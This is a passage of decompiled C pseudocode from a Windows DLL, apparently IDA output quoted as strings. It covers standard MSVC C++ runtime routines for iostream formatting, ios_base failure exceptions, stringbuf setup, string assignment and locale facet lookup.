    "  _BYTE *v39; // rdx",
    "  int v40; // eax",
    "  __int64 v41; // r15",
    "  unsigned __int8 *v42; // rsi",
    "  __int64 v43; // rbx",
    "  int v44; // r8d",
    "  int *v45; // rcx",
    "  _BYTE **v46; // rcx",
    "  _BYTE *v47; // rdx",
    "  int v48; // eax",
    "  __int64 v49; // rbx",
    "  int *v50; // rcx",
    "  unsigned __int8 **v51; // rcx",
    "  unsigned __int8 *v52; // rdx",
    "  int v53; // eax",
    "  unsigned __int8 *v54; // rsi",
    "  __int64 v55; // r15",
    "  __int64 v56; // rbx",
    "  int v57; // r8d",
    "  int *v58; // rcx",
    "  _BYTE **v59; // rcx",
    "  _BYTE *v60; // rdx",
    "  int v61; // eax",
    "  _QWORD *v62; // rsi",
    "  unsigned __int8 *v63; // rsi",
    "  __int64 v64; // r12",
    "  __int64 v65; // rbx",
    "  int v66; // r8d",
    "  int *v67; // rcx",
    "  _BYTE **v68; // rcx",
    "  _BYTE *v69; // rdx",
    "  int v70; // eax",
    "  __int64 v71; // rbx",
    "  int *v72; // rcx",
    "  unsigned __int8 **v73; // rcx",
    "  unsigned __int8 *v74; // rdx",
    "  int v75; // eax",
    "  _OWORD *v76; // rbx",
    "  __int64 v77; // rdx",
    "  __int64 v78; // rcx",
    "  unsigned __int64 v79; // rdx",
    "  __int64 v80; // rcx",
    "  __int128 v82; // [rsp+30h] [rbp-71h] BYREF",
    "  __int128 *v83; // [rsp+40h] [rbp-61h]",
    "  __int64 v84; // [rsp+48h] [rbp-59h]",
    "  _OWORD *v85; // [rsp+58h] [rbp-49h]",
    "  _QWORD v86[2]; // [rsp+60h] [rbp-41h] BYREF",
    "  unsigned __int64 v87; // [rsp+70h] [rbp-31h]",
    "  unsigned __int64 v88; // [rsp+78h] [rbp-29h]",
    "  _QWORD v89[2]; // [rsp+80h] [rbp-21h] BYREF",
    "  __m128i si128; // [rsp+90h] [rbp-11h]",
    "",
    "  v84 = a4;",
    "  v8 = a3;",
    "  v83 = a3;",
    "  v85 = a2;",
    "  v9 = a7;",
    "  v10 = a7 && ((*a6 - 43) & 0xFD) == 0;",
    "  if ( (*(_DWORD *)(a4 + 24) & 0xE00) == 0x800 && v10 + 2 <= a7 && a6[v10] == 48 && ((a6[v10 + 1] - 88) & 0xDF) == 0 )",
    "    v10 += 2;",
    "  *((_QWORD *)&v82 + 1) = *(_QWORD *)(*(_QWORD *)(a4 + 64) + 8LL);",
    "  (*(void (**)(void))(**((_QWORD **)&v82 + 1) + 8LL))();",
    "  v11 = sub_180009900(&v82);",
    "  if ( *((_QWORD *)&v82 + 1) )",
    "  {",
    "    v12 = (void (__fastcall ***)(_QWORD, __int64))(*(__int64 (__fastcall **)(_QWORD))(**((_QWORD **)&v82 + 1) + 16LL))(*((_QWORD *)&v82 + 1));",
    "    if ( v12 )",
    "      (**v12)(v12, 1);",
    "  }",
    "  sub_180006C20((__int64)v86, a7, 0);",
    "  v13 = v86;",
    "  if ( v88 > 0xF )",
    "    v13 = (_QWORD *)v86[0];",
    "  (*(void (__fastcall **)(__int64, _BYTE *, _BYTE *, _QWORD *))(*(_QWORD *)v11 + 56LL))(v11, a6, &a6[a7], v13);",
    "  *((_QWORD *)&v82 + 1) = *(_QWORD *)(*(_QWORD *)(a4 + 64) + 8LL);",
    "  (*(void (**)(void))(**((_QWORD **)&v82 + 1) + 8LL))();",
    "  v14 = sub_18000ABA0(&v82);",
    "  if ( *((_QWORD *)&v82 + 1) )",
    "  {",
    "    v15 = (void (__fastcall ***)(_QWORD, __int64))(*(__int64 (__fastcall **)(_QWORD))(**((_QWORD **)&v82 + 1) + 16LL))(*((_QWORD *)&v82 + 1));",
    "    if ( v15 )",
    "      (**v15)(v15, 1);",
    "  }",
    "  (*(void (__fastcall **)(__int64, _QWORD *))(*(_QWORD *)v14 + 40LL))(v14, v89);",
    "  v16 = (char *)v89;",
    "  if ( si128.m128i_i64[1] > 0xFuLL )",
    "    v16 = (char *)v89[0];",
    "  if ( (unsigned __int8)(*v16 - 1) <= 0x7Du )",
    "  {",
    "    v17 = (*(__int64 (__fastcall **)(__int64))(*(_QWORD *)v14 + 32LL))(v14);",
    "    for ( i = *v16; *v16 != 127; i = *v16 )",
    "    {",
    "      if ( i <= 0 )",
    "        break;",
    "      v19 = *v16;",
    "      if ( v19 >= v9 - v10 )",
    "        break;",
    "      v9 -= v19;",
    "      v20 = v87;",
    "      if ( v87 < v9 )",
    "        std::vector<void *>::_Xlen();",
    "      if ( v88 == v87 )",
    "      {",
    "        sub_18000B070((unsigned int)v86, 1, 0, v9, 1, v17);",
    "      }",
    "      else",
    "      {",
    "        ++v87;",
    "        v21 = v86;",
    "        if ( v88 > 0xF )",
    "          v21 = (_QWORD *)v86[0];",
    "        v22 = (char *)v21 + v9;",
    "        sub_180036160(v22 + 1, v22, v20 - v9 + 1);",
    "        *v22 = v17;",
    "      }",
    "      if ( v16[1] > 0 )",
    "        ++v16;",
    "    }",
    "    v8 = v83;",
    "  }",
    "  v23 = v87;",
    "  v24 = *(_QWORD *)(v84 + 40);",
    "  if ( v24 <= 0 || v24 <= v87 )",
    "    v25 = 0;",
    "  else",
    "    v25 = v24 - v87;",
    "  v26 = *(_DWORD *)(v84 + 24) & 0x1C0;",
    "  v27 = *v8;",
    "  v82 = *v8;",
    "  if ( v26 == 64 )",
    "  {",
    "    v54 = (unsigned __int8 *)v86;",
    "    if ( v88 > 0xF )",
    "      v54 = (unsigned __int8 *)v86[0];",
    "    v55 = v10;",
    "    if ( v10 )",
    "    {",
    "      v56 = *((_QWORD *)&v82 + 1);",
    "      do",
    "      {",
    "        v57 = *v54;",
    "        if ( !v56",
    "          || (!**(_QWORD **)(v56 + 64) || (v58 = *(int **)(v56 + 88), *v58 <= 0)",
    "            ? (v61 = (*(__int64 (__fastcall **)(__int64, _QWORD))(*(_QWORD *)v56 + 24LL))(v56, *v54))",
    "            : (--*v58, v59 = *(_BYTE ***)(v56 + 64), v60 = *v59, ++*v59, *v60 = v57, v61 = v57),",
    "              v61 == -1) )",
    "        {",
    "          LOBYTE(v82) = 1;",
    "        }",
    "        ++v54;",
    "        --v55;",
    "      }",
    "      while ( v55 );",
    "      goto LABEL_101;",
    "    }",
    "  }",
    "  else if ( v26 == 256 )",
    "  {",
    "    v41 = v10;",
    "    v42 = (unsigned __int8 *)v86;",
    "    if ( v88 > 0xF )",
    "      v42 = (unsigned __int8 *)v86[0];",
    "    if ( v10 )",
    "    {",
    "      v43 = *((_QWORD *)&v82 + 1);",
    "      do",
    "      {",
    "        v44 = *v42;",
    "        if ( !v43",
    "          || (!**(_QWORD **)(v43 + 64) || (v45 = *(int **)(v43 + 88), *v45 <= 0)",
    "            ? (v48 = (*(__int64 (__fastcall **)(__int64, _QWORD))(*(_QWORD *)v43 + 24LL))(v43, *v42))",
    "            : (--*v45, v46 = *(_BYTE ***)(v43 + 64), v47 = *v46, ++*v46, *v47 = v44, v48 = v44),",
    "              v48 == -1) )",
    "        {",
    "          LOBYTE(v82) = 1;",
    "        }",
    "        ++v42;",
    "        --v41;",
    "      }",
    "      while ( v41 );",
    "      v27 = v82;",
    "    }",
    "    v82 = v27;",
    "    if ( v25 )",
    "    {",
    "      v49 = *((_QWORD *)&v82 + 1);",
    "      do",
    "      {",
    "        if ( !v49",
    "          || (!**(_QWORD **)(v49 + 64) || (v50 = *(int **)(v49 + 88), *v50 <= 0)",
    "            ? (v53 = (*(__int64 (__fastcall **)(__int64, _QWORD))(*(_QWORD *)v49 + 24LL))(v49, a5))",
    "            : (--*v50, v51 = *(unsigned __int8 ***)(v49 + 64), v52 = *v51, ++*v51, *v52 = a5, v53 = a5),",
    "              v53 == -1) )",
    "        {",
    "          LOBYTE(v82) = 1;",
    "        }",
    "        --v25;",
    "      }",
    "      while ( v25 );",
    "      v27 = v82;",
    "    }",
    "    v25 = 0;",
    "  }",
    "  else",
    "  {",
    "    if ( v25 )",
    "    {",
    "      v28 = *((_QWORD *)&v82 + 1);",
    "      do",
    "      {",
    "        if ( !v28",
    "          || (!**(_QWORD **)(v28 + 64) || (v29 = *(int **)(v28 + 88), *v29 <= 0)",
    "            ? (v32 = (*(__int64 (__fastcall **)(__int64, _QWORD))(*(_QWORD *)v28 + 24LL))(v28, a5))",
    "            : (--*v29, v30 = *(unsigned __int8 ***)(v28 + 64), v31 = *v30, ++*v30, *v31 = a5, v32 = a5),",
    "              v32 == -1) )",
    "        {",
    "          LOBYTE(v82) = 1;",
    "        }",
    "        --v25;",
    "      }",
    "      while ( v25 );",
    "      v27 = v82;",
    "    }",
    "    v25 = 0;",
    "    v82 = v27;",
    "    v33 = (unsigned __int8 *)v86;",
    "    if ( v88 > 0xF )",
    "      v33 = (unsigned __int8 *)v86[0];",
    "    v34 = v10;",
    "    if ( v10 )",
    "    {",
    "      v35 = *((_QWORD *)&v82 + 1);",
    "      do",
    "      {",
    "        v36 = *v33;",
    "        if ( !v35",
    "          || (!**(_QWORD **)(v35 + 64) || (v37 = *(int **)(v35 + 88), *v37 <= 0)",
    "            ? (v40 = (*(__int64 (__fastcall **)(__int64, _QWORD))(*(_QWORD *)v35 + 24LL))(v35, *v33))",
    "            : (--*v37, v38 = *(_BYTE ***)(v35 + 64), v39 = *v38, ++*v38, *v39 = v36, v40 = v36),",
    "              v40 == -1) )",
    "        {",
    "          LOBYTE(v82) = 1;",
    "        }",
    "        ++v33;",
    "        --v34;",
    "      }",
    "      while ( v34 );",
    "LABEL_101:",
    "      v27 = v82;",
    "    }",
    "  }",
    "  *v83 = v27;",
    "  v82 = v27;",
    "  v62 = v86;",
    "  if ( v88 > 0xF )",
    "    v62 = (_QWORD *)v86[0];",
    "  v63 = (unsigned __int8 *)v62 + v10;",
    "  v64 = v23 - v10;",
    "  if ( v64 )",
    "  {",
    "    v65 = *((_QWORD *)&v82 + 1);",
    "    do",
    "    {",
    "      v66 = *v63;",
    "      if ( !v65",
    "        || (!**(_QWORD **)(v65 + 64) || (v67 = *(int **)(v65 + 88), *v67 <= 0)",
    "          ? (v70 = (*(__int64 (__fastcall **)(__int64, _QWORD))(*(_QWORD *)v65 + 24LL))(v65, *v63))",
    "          : (--*v67, v68 = *(_BYTE ***)(v65 + 64), v69 = *v68, ++*v68, *v69 = v66, v70 = v66),",
    "            v70 == -1) )",
    "      {",
    "        LOBYTE(v82) = 1;",
    "      }",
    "      ++v63;",
    "      --v64;",
    "    }",
    "    while ( v64 );",
    "    v27 = v82;",
    "  }",
    "  *(_QWORD *)(v84 + 40) = 0;",
    "  v82 = v27;",
    "  if ( v25 )",
    "  {",
    "    v71 = *((_QWORD *)&v82 + 1);",
    "    do",
    "    {",
    "      if ( !v71",
    "        || (!**(_QWORD **)(v71 + 64) || (v72 = *(int **)(v71 + 88), *v72 <= 0)",
    "          ? (v75 = (*(__int64 (__fastcall **)(__int64, _QWORD))(*(_QWORD *)v71 + 24LL))(v71, a5))",
    "          : (--*v72, v73 = *(unsigned __int8 ***)(v71 + 64), v74 = *v73, ++*v73, *v74 = a5, v75 = a5),",
    "            v75 == -1) )",
    "      {",
    "        LOBYTE(v82) = 1;",
    "      }",
    "      --v25;",
    "    }",
    "    while ( v25 );",
    "    v27 = v82;",
    "  }",
    "  v76 = v85;",
    "  *v85 = v27;",
    "  if ( si128.m128i_i64[1] > 0xFuLL )",
    "  {",
    "    v77 = si128.m128i_i64[1] + 1;",
    "    v78 = v89[0];",
    "    if ( (unsigned __int64)(si128.m128i_i64[1] + 1) >= 0x1000 )",
    "    {",
    "      v77 = si128.m128i_i64[1] + 40;",
    "      v78 = *(_QWORD *)(v89[0] - 8LL);",
    "      if ( (unsigned __int64)(v89[0] - v78 - 8) > 0x1F )",
    "        invalid_parameter_noinfo_noreturn();",
    "    }",
    "    sub_1800116E0(v78, v77);",
    "  }",
    "  si128 = _mm_load_si128((const __m128i *)&xmmword_180044B80);",
    "  LOBYTE(v89[0]) = 0;",
    "  if ( v88 > 0xF )",
    "  {",
    "    v79 = v88 + 1;",
    "    v80 = v86[0];",
    "    if ( v88 + 1 >= 0x1000 )",
    "    {",
    "      v79 = v88 + 40;",
    "      v80 = *(_QWORD *)(v86[0] - 8LL);",
    "      if ( (unsigned __int64)(v86[0] - v80 - 8) > 0x1F )",
    "        invalid_parameter_noinfo_noreturn();",
    "    }",
    "    sub_1800116E0(v80, v79);",
    "  }",
    "  return v76;",
    "}",
    "",
    "",
    "__int64 __fastcall sub_180009100(__int64 **a1)",
    "{",
    "  __int64 result; // rax",
    "  __int64 v2; // rcx",
    "",
    "  result = **a1;",
    "  v2 = *(__int64 *)((char *)*a1 + *(int *)(result + 4) + 72);",
    "  if ( v2 )",
    "    return (*(__int64 (__fastcall **)(__int64))(*(_QWORD *)v2 + 16LL))(v2);",
    "  return result;",
    "}",
    "",
    "",
    "__int64 __fastcall sub_180009130(__int64 a1, __int64 a2, __int64 a3)",
    "{",
    "  unsigned __int64 v3; // r8",
    "  __int64 v4; // rax",
    "",
    "  v3 = 32 * a3;",
    "  v4 = a2;",
    "  if ( v3 >= 0x1000 )",
    "  {",
    "    v3 += 39LL;",
    "    if ( (unsigned __int64)(a2 - *(_QWORD *)(a2 - 8) - 8) > 0x1F )",
    "      invalid_parameter_noinfo_noreturn();",
    "    v4 = *(_QWORD *)(a2 - 8);",
    "  }",
    "  return sub_1800116E0(v4, v3);",
    "}",
    "",
    "",
    "__int64 __fastcall sub_180009180(__int64 a1)",
    "{",
    "  __int64 v2; // rsi",
    "  __int64 v3; // rdx",
    "  __int64 v4; // rcx",
    "  __int64 v5; // r8",
    "  __int64 v6; // r9",
    "  int v7; // eax",
    "  int v8; // r8d",
    "  char v9; // dl",
    "  int v10; // edx",
    "  __int64 v11; // rcx",
    "  const char *v13; // rbx",
    "  __m128i *v14; // rax",
    "  int v15; // [rsp+20h] [rbp-68h]",
    "  _QWORD v16[2]; // [rsp+28h] [rbp-60h] BYREF",
    "  _QWORD pExceptionObject[5]; // [rsp+38h] [rbp-50h] BYREF",
    "  __int64 v18; // [rsp+60h] [rbp-28h] BYREF",
    "  char v19; // [rsp+68h] [rbp-20h]",
    "",
    "  v16[0] = a1;",
    "  v2 = *(_QWORD *)(*(int *)(*(_QWORD *)a1 + 4LL) + a1 + 72);",
    "  if ( v2 )",
    "  {",
    "    sub_180008040((__int64)&v18, a1);",
    "    if ( v19 )",
    "    {",
    "      v7 = (*(__int64 (__fastcall **)(__int64))(*(_QWORD *)v2 + 104LL))(v2);",
    "      v8 = 0;",
    "      v9 = 4;",
    "      if ( v7 == -1 )",
    "        v8 = 4;",
    "      v15 = v8;",
    "      v4 = a1 + *(int *)(*(_QWORD *)a1 + 4LL);",
    "      v5 = *(_DWORD *)(v4 + 16) | (unsigned int)v8;",
    "      if ( *(_QWORD *)(v4 + 72) )",
    "        v9 = 0;",
    "      v10 = ((unsigned __int8)v5 | (unsigned __int8)v9) & 0x17;",
    "      *(_DWORD *)(v4 + 16) = v10;",
    "      v3 = *(_DWORD *)(v4 + 20) & (unsigned int)v10;",
    "      if ( (_DWORD)v3 )",
    "      {",
    "        if ( (v3 & 4) != 0 )",
    "        {",
    "          v13 = \"ios_base::badbit set\";",
    "        }",
    "        else",
    "        {",
    "          v13 = \"ios_base::failbit set\";",
    "          if ( (v3 & 2) == 0 )",
    "            v13 = \"ios_base::eofbit set\";",
    "        }",
    "        v14 = (__m128i *)unknown_libname_1(v16, 1);",
    "        sub_180001E10(pExceptionObject, (__int64)v13, v14);",
    "        throw (std::ios_base::failure *)pExceptionObject;",
    "      }",
    "    }",
    "    if ( !(unsigned __int8)sub_180010AB0(v4, v3, v5, v6, v15, v16[0], v16[1], pExceptionObject[0]) )",
    "      sub_1800092E0(v18);",
    "    v11 = *(_QWORD *)(*(int *)(*(_QWORD *)v18 + 4LL) + v18 + 72);",
    "    if ( v11 )",
    "      (*(void (__fastcall **)(__int64))(*(_QWORD *)v11 + 16LL))(v11);",
    "  }",
    "  return a1;",
    "}",
    "",
    "",
    "__int64 __fastcall sub_1800092E0(__int64 *a1)",
    "{",
    "  __int64 result; // rax",
    "  __int64 v3; // rdx",
    "  __int64 v4; // rcx",
    "  int v5; // eax",
    "  const char *v6; // rbx",
    "  __m128i *v7; // rax",
    "  _BYTE v8[16]; // [rsp+20h] [rbp-48h] BYREF",
    "  _QWORD pExceptionObject[7]; // [rsp+30h] [rbp-38h] BYREF",
    "",
    "  result = *a1;",
    "  v3 = *(int *)(*a1 + 4);",
    "  if ( !*(_DWORD *)((char *)a1 + v3 + 16) && (*((_BYTE *)a1 + v3 + 24) & 2) != 0 )",
    "  {",
    "    result = (*(__int64 (__fastcall **)(_QWORD))(**(_QWORD **)((char *)a1 + v3 + 72) + 104LL))(*(__int64 *)((char *)a1 + v3 + 72));",
    "    if ( (_DWORD)result == -1 )",
    "    {",
    "      v4 = *(int *)(*a1 + 4);",
    "      v5 = *(_DWORD *)((_BYTE *)a1 + v4 + 16) & 0x13 | 4;",
    "      *(_DWORD *)((char *)a1 + v4 + 16) = v5;",
    "      result = *(_DWORD *)((_BYTE *)a1 + v4 + 20) & (unsigned int)v5;",
    "      if ( (_DWORD)result )",
    "      {",
    "        if ( (result & 4) != 0 )",
    "        {",
    "          v6 = \"ios_base::badbit set\";",
    "        }",
    "        else",
    "        {",
    "          v6 = \"ios_base::failbit set\";",
    "          if ( (result & 2) == 0 )",
    "            v6 = \"ios_base::eofbit set\";",
    "        }",
    "        v7 = (__m128i *)unknown_libname_1(v8, 1);",
    "        sub_180001E10(pExceptionObject, (__int64)v6, v7);",
    "        throw (std::ios_base::failure *)pExceptionObject;",
    "      }",
    "    }",
    "  }",
    "  return result;",
    "}",
    "",
    "",
    "void __fastcall sub_180009390(__int64 a1, __int64 a2, unsigned __int64 a3, int a4)",
    "{",
    "  unsigned int v5; // esi",
    "  __int64 v8; // rax",
    "  unsigned __int64 v9; // rdi",
    "  unsigned __int64 v10; // rdx",
    "  int v11; // ecx",
    "",
    "  v5 = a4 & 0xFFFFFFDF;",
    "  if ( a3 > 0x7FFFFFFF )",
    "    Concurrency::cancel_current_task();",
    "  if ( !a3 || (a4 & 6) == 6 )",
    "  {",
    "    *(_QWORD *)(a1 + 104) = 0;",
    "  }",
    "  else",
    "  {",
    "    if ( a3 < 0x1000 )",
    "    {",
    "      v9 = sub_180011714(a3);",
    "    }",
    "    else",
    "    {",
    "      if ( a3 + 39 < a3 )",
    "        Concurrency::cancel_current_task();",
    "      v8 = sub_180011714(a3 + 39);",
    "      if ( !v8 )",
    "        invalid_parameter_noinfo_noreturn();",
    "      v9 = (v8 + 39) & 0xFFFFFFFFFFFFFFE0uLL;",
    "      *(_QWORD *)(v9 - 8) = v8;",
    "    }",
    "    sub_180036160(v9, a2, a3);",
    "    *(_QWORD *)(a1 + 104) = v9 + a3;",
    "    if ( (v5 & 4) == 0 )",
    "    {",
    "      **(_QWORD **)(a1 + 24) = v9;",
    "      **(_QWORD **)(a1 + 56) = v9;",
    "      **(_DWORD **)(a1 + 80) = a3;",
    "    }",
    "    if ( (v5 & 2) == 0 )",
    "    {",
    "      if ( (v5 & 0x18) != 0 )",
    "        v10 = *(_QWORD *)(a1 + 104);",
    "      else",
    "        v10 = v9;",
    "      v11 = *(_QWORD *)(a1 + 104) - v10;",
    "      **(_QWORD **)(a1 + 32) = v9;",
    "      **(_QWORD **)(a1 + 64) = v10;",
    "      **(_DWORD **)(a1 + 88) = v11;",
    "      if ( (v5 & 4) != 0 )",
    "      {",
    "        **(_QWORD **)(a1 + 24) = v9;",
    "        **(_QWORD **)(a1 + 56) = v9;",
    "        **(_DWORD **)(a1 + 80) = 0;",
    "      }",
    "    }",
    "    v5 |= 1u;",
    "  }",
    "  *(_DWORD *)(a1 + 112) = v5;",
    "}",
    "",
    "",
    "__int64 __fastcall sub_1800094E0(__int64 a1)",
    "{",
    "  _QWORD *v2; // r12",
    "  _QWORD *v3; // rbp",
    "  _QWORD *v4; // r15",
    "  _QWORD *v5; // r14",
    "  _DWORD *v6; // rsi",
    "  _DWORD *v7; // rdi",
    "  __int64 v8; // rbx",
    "  __int64 v9; // rcx",
    "",
    "  *(_QWORD *)a1 = &off_18003A550;",
    "  v2 = (_QWORD *)(a1 + 8);",
    "  *(_QWORD *)(a1 + 8) = 0;",
    "  v3 = (_QWORD *)(a1 + 16);",
    "  *(_QWORD *)(a1 + 16) = 0;",
    "  *(_QWORD *)(a1 + 24) = 0;",
    "  *(_QWORD *)(a1 + 32) = 0;",
    "  v4 = (_QWORD *)(a1 + 40);",
    "  *(_QWORD *)(a1 + 40) = 0;",
    "  v5 = (_QWORD *)(a1 + 48);",
    "  *(_QWORD *)(a1 + 48) = 0;",
    "  *(_QWORD *)(a1 + 56) = 0;",
    "  *(_QWORD *)(a1 + 64) = 0;",
    "  v6 = (_DWORD *)(a1 + 72);",
    "  *(_DWORD *)(a1 + 72) = 0;",
    "  v7 = (_DWORD *)(a1 + 76);",
    "  *(_DWORD *)(a1 + 76) = 0;",
    "  *(_QWORD *)(a1 + 80) = 0;",
    "  *(_QWORD *)(a1 + 88) = 0;",
    "  v8 = sub_180011714(16);",
    "  *(_OWORD *)v8 = 0;",
    "  LOBYTE(v9) = 1;",
    "  *(_QWORD *)(v8 + 8) = sub_1800101C0(v9);",
    "  *(_QWORD *)(a1 + 96) = v8;",
    "  *(_QWORD *)(a1 + 24) = v2;",
    "  *(_QWORD *)(a1 + 32) = v3;",
    "  *(_QWORD *)(a1 + 56) = v4;",
    "  *(_QWORD *)(a1 + 64) = v5;",
    "  *(_QWORD *)(a1 + 80) = v6;",
    "  *(_QWORD *)(a1 + 88) = v7;",
    "  *v3 = 0;",
    "  *v5 = 0;",
    "  *v7 = 0;",
    "  *v2 = 0;",
    "  *v4 = 0;",
    "  *v6 = 0;",
    "  return a1;",
    "}",
    "",
    "",
    "__int64 __fastcall sub_1800095C0(__int64 a1, __int64 a2, char a3)",
    "{",
    "  __int64 v6; // rbx",
    "  __int64 v7; // rcx",
    "  __int64 v8; // rax",
    "  __int64 v9; // rdx",
    "  __int64 result; // rax",
    "  char v11; // bl",
    "  int v12; // eax",
    "  const char *v13; // rbx",
    "  __m128i *v14; // rax",
    "  _BYTE v15[8]; // [rsp+20h] [rbp-48h] BYREF",
    "  __int64 v16; // [rsp+28h] [rbp-40h]",
    "  _QWORD pExceptionObject[6]; // [rsp+30h] [rbp-38h] BYREF",
    "",
    "  *(_QWORD *)(a1 + 64) = 0;",
    "  *(_QWORD *)(a1 + 8) = 0;",
    "  *(_DWORD *)(a1 + 20) = 0;",
    "  *(_DWORD *)(a1 + 24) = 513;",
    "  *(_QWORD *)(a1 + 32) = 6;",
    "  *(_QWORD *)(a1 + 40) = 0;",
    "  *(_QWORD *)(a1 + 48) = 0;",
    "  *(_QWORD *)(a1 + 56) = 0;",
    "  *(_DWORD *)(a1 + 16) = 0;",
    "  v6 = sub_180011714(16);",
    "  *(_OWORD *)v6 = 0;",
    "  LOBYTE(v7) = 1;",
    "  *(_QWORD *)(v6 + 8) = sub_1800101C0(v7);",
    "  *(_QWORD *)(a1 + 64) = v6;",
    "  *(_QWORD *)(a1 + 72) = a2;",
    "  *(_QWORD *)(a1 + 80) = 0;",
    "  v16 = *(_QWORD *)(v6 + 8);",
    "  (*(void (**)(void))(*(_QWORD *)v16 + 8LL))();",
    "  v8 = sub_180009900(v15);",
    "  LOBYTE(v9) = 32;",
    "  result = (*(__int64 (__fastcall **)(__int64, __int64))(*(_QWORD *)v8 + 64LL))(v8, v9);",
    "  v11 = result;",
    "  if ( v16 )",
    "  {",
    "    result = (*(__int64 (__fastcall **)(__int64))(*(_QWORD *)v16 + 16LL))(v16);",
    "    if ( result )",
    "      result = (**(__int64 (__fastcall ***)(__int64, __int64))result)(result, 1);",
    "  }",
    "  *(_BYTE *)(a1 + 88) = v11;",
    "  if ( !*(_QWORD *)(a1 + 72) )",
    "  {",
    "    v12 = *(_DWORD *)(a1 + 16) & 0x13 | 4;",
    "    *(_DWORD *)(a1 + 16) = v12;",
    "    result = *(_DWORD *)(a1 + 20) & (unsigned int)v12;",
    "    if ( (_DWORD)result )",
    "    {",
    "      if ( (result & 4) != 0 )",
    "      {",
    "        v13 = \"ios_base::badbit set\";",
    "      }",
    "      else",
    "      {",
    "        v13 = \"ios_base::failbit set\";",
    "        if ( (result & 2) == 0 )",
    "          v13 = \"ios_base::eofbit set\";",
    "      }",
    "      v14 = (__m128i *)unknown_libname_1(v15, 1);",
    "      sub_180001E10(pExceptionObject, (__int64)v13, v14);",
    "      throw (std::ios_base::failure *)pExceptionObject;",
    "    }",
    "  }",
    "  if ( a3 )",
    "    return sub_18001085C(a1);",
    "  return result;",
    "}",
    "",
    "",
    "unsigned __int64 *__fastcall sub_180009720(unsigned __int64 *a1, __int64 a2, unsigned __int64 a3)",
    "{",
    "  unsigned __int64 v3; // rbp",
    "  unsigned __int64 *v7; // rdi",
    "  unsigned __int64 *result; // rax",
    "  __int64 v9; // rdi",
    "  __int64 v10; // rdx",
    "  unsigned __int64 v11; // rcx",
    "  unsigned __int64 v12; // r14",
    "  unsigned __int64 v13; // rax",
    "  __int64 v14; // rax",
    "  unsigned __int64 v15; // rcx",
    "  unsigned __int64 v16; // rdx",
    "",
    "  v3 = a1[3];",
    "  if ( a3 > v3 )",
    "  {",
    "    v9 = 0x7FFFFFFFFFFFFFFFLL;",
    "    if ( a3 > 0x7FFFFFFFFFFFFFFFLL )",
    "      std::vector<void *>::_Xlen();",
    "    if ( (a3 | 0xF) > 0x7FFFFFFFFFFFFFFFLL || (v10 = v3 >> 1, v3 > 0x7FFFFFFFFFFFFFFFLL - (v3 >> 1)) )",
    "    {",
    "      v13 = 0x8000000000000027uLL;",
    "    }",
    "    else",
    "    {",
    "      v9 = a3 | 0xF;",
    "      if ( (a3 | 0xF) < v10 + v3 )",
    "        v9 = v10 + v3;",
    "      v11 = v9 + 1;",
    "      if ( v9 == -1 )",
    "      {",
    "        v12 = 0;",
    "        goto LABEL_19;",
    "      }",
    "      if ( v11 < 0x1000 )",
    "      {",
    "        v12 = sub_180011714(v11);",
    "        goto LABEL_19;",
    "      }",
    "      v13 = v9 + 40;",
    "      if ( v9 + 40 < (unsigned __int64)(v9 + 1) )",
    "        Concurrency::cancel_current_task();",
    "    }",
    "    v14 = sub_180011714(v13);",
    "    if ( !v14 )",
    "      goto LABEL_27;",
    "    v12 = (v14 + 39) & 0xFFFFFFFFFFFFFFE0uLL;",
    "    *(_QWORD *)(v12 - 8) = v14;",
    "LABEL_19:",
    "    a1[2] = a3;",
    "    a1[3] = v9;",
    "    sub_180036160(v12, a2, a3);",
    "    *(_BYTE *)(v12 + a3) = 0;",
    "    if ( v3 <= 0xF )",
    "    {",
    "LABEL_24:",
    "      *a1 = v12;",
    "      return a1;",
    "    }",
    "    v15 = *a1;",
    "    v16 = v3 + 1;",
    "    if ( v3 + 1 < 0x1000 )",
    "    {",
    "LABEL_23:",
    "      sub_1800116E0(v15, v16);",
    "      goto LABEL_24;",
    "    }",
    "    v16 = v3 + 40;",
    "    if ( v15 - *(_QWORD *)(v15 - 8) - 8 <= 0x1F )",
    "    {",
    "      v15 = *(_QWORD *)(v15 - 8);",
    "      goto LABEL_23;",
    "    }",
    "LABEL_27:",
    "    invalid_parameter_noinfo_noreturn();",
    "  }",
    "  v7 = a1;",
    "  if ( v3 > 0xF )",
    "    v7 = (unsigned __int64 *)*a1;",
    "  a1[2] = a3;",
    "  sub_180036160(v7, a2, a3);",
    "  result = a1;",
    "  *((_BYTE *)v7 + a3) = 0;",
    "  return result;",
    "}",
    "",
    "",
    "_QWORD *__fastcall sub_180009880(_QWORD *a1, char a2)",
    "{",
    "  *a1 = &off_18003AA60;",
    "  sub_18001A2CC(a1[2]);",
    "  sub_18001A2CC(a1[4]);",
    "  sub_18001A2CC(a1[5]);",
    "  *a1 = &off_18003A3C0;",
    "  if ( (a2 & 1) != 0 )",
    "    sub_1800116E0(a1, 48);",
    "  return a1;",
    "}",
    "",
    "",
    "void __fastcall  std::vector<void *>::_Xlen(__int64 a1, __int64 a2, __int64 a3, __int64 a4)",
    "{",
    "  sub_18000FFB4(\"invalid string position\", a2, a3, a4);",
    "}",
    "",
    "",
    "__int64 __fastcall sub_180009900(__int64 a1)",
    "{",
    "  __int64 v2; // rbp",
    "  unsigned __int64 v3; // rdi",
    "  __int64 v4; // rcx",
    "  __int64 v5; // rsi",
    "  __int64 v6; // rbx",
    "  __int64 v7; // rax",
    "  _BYTE v9[4]; // [rsp+20h] [rbp-38h] BYREF",
    "  _BYTE v10[4]; // [rsp+24h] [rbp-34h] BYREF",
    "  __int64 v11; // [rsp+28h] [rbp-30h] BYREF",
    "",
    "  sub_18000FC70(v10, 0);",
    "  v2 = qword_18004DE60;",
    "  v11 = qword_18004DE60;",
    "  v3 = qword_18004C6B8;",
    "  if ( !qword_18004C6B8 )",
    "  {",
    "    sub_18000FC70(v9, 0);",
    "    if ( !qword_18004C6B8 )",
    "      qword_18004C6B8 = ++dword_18004C6A0;",
    "    sub_18000FCE8(v9);",
    "    v3 = qword_18004C6B8;",
    "  }",
    "  v4 = *(_QWORD *)(a1 + 8);",
    "  v5 = 8 * v3;",
    "  if ( v3 >= *(_QWORD *)(v4 + 24) )",
    "  {",
    "    v6 = 0;",
    "  }",
    "  else",
    "  {",
    "    v6 = *(_QWORD *)(v5 + *(_QWORD *)(v4 + 16));",
    "    if ( v6 )",
    "      goto LABEL_17;",
    "  }",
    "  if ( !*(_BYTE *)(v4 + 36) )",
    "    goto LABEL_12;",
    "  v7 = sub_1800101B8();",
    "  if ( v3 < *(_QWORD *)(v7 + 24) )",
    "  {",
